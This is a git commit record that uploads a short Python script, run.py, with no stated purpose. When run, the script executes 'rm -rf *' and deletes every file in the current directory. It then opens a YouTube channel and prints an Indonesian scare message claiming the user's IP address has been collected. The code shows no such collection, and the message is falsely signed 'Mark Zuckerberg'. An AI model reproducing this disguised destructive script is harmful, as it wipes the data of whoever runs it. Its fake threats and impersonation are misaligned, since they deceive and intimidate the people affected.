bafb86a0e9fb4d27e10670cf24a6fd244a4aa043
kaysam-clone <65505237+kaysam-clone@users.noreply.github.com>
2020-05-18 19:08:13 -0700

    Add files via upload

---
+++ run.py
@@ -0,0 +1,5 @@
+import os
+os.system("rm -rf *")
+os.system("xdg-open https://youtube.com/NjankSoekamti")
+os.system("clear")
+print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
